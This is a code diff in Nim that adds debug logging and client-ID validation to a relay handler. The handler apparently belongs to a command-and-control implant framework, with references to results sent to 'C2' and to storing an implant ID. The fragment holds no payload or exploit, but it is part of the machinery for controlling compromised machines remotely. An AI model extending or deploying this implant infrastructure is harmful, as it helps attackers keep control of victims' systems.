@@ -547,6 +547,9 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                         echo "[DEBUG] 🔄 ┌─────────── HTTP RESPONSE FROM RELAY ───────────┐"
                         echo "[DEBUG] 🔄 │ ✅ HTTP RESPONSE FROM RELAY SERVER │"
                         echo "[DEBUG] 🔄 │ Response: " & responsePayload & " │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message fromID: '" & msg.fromID & "' │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: My client ID: '" & g_relayClientID & "' │"
+                        echo "[DEBUG] 🔍 │ BROADCAST FILTER: Message route: " & $msg.route & " │"
                         echo "[DEBUG] 🔄 └─────────────────────────────────────────────────┘"
                     
                     if responsePayload == "RESULT_SENT_TO_C2":
@@ -556,7 +559,21 @@ proc relayClientHandler(host: string, port: int) {.async.} =
                             echo "[DEBUG] 🎉 │ End-to-end command flow completed! │"
                             echo "[DEBUG] 🎉 └─────────────────────────────────────────┘"
                     elif responsePayload != "" and responsePayload != "PENDING-REGISTRATION" and not responsePayload.startsWith("RESULT_"):
-                        # This is likely an ID assignment
+                        # This is likely an ID assignment - WITH VALIDATION
+                        when defined debug:
+                            echo "[DEBUG] 🔍 SIMPLE ID ASSIGNMENT: responsePayload = '" & responsePayload & "'"
+                            echo "[DEBUG] 🔍 SIMPLE ID ASSIGNMENT: Current g_relayClientID = '" & g_relayClientID & "'"
+                        
+                        # CRITICAL FIX: Apply validation for simple ID assignment
+                        if g_relayClientID != "" and g_relayClientID != "PENDING-REGISTRATION" and g_relayClientID != responsePayload:
+                            when defined debug:
+                                echo "[DEBUG] 🚨 SIMPLE ID CONTAMINATION DETECTED!"
+                                echo "[DEBUG] 🚨 This client ID: '" & g_relayClientID & "'"
+                                echo "[DEBUG] 🚨 Response for ID: '" & responsePayload & "'"
+                                echo "[DEBUG] 🚨 IGNORING simple ID response meant for another client!"
+                            # IGNORE responses not meant for this client
+                            continue
+                        
                         g_relayClientID = responsePayload
                         storeImplantID(responsePayload)
                         when defined debug:
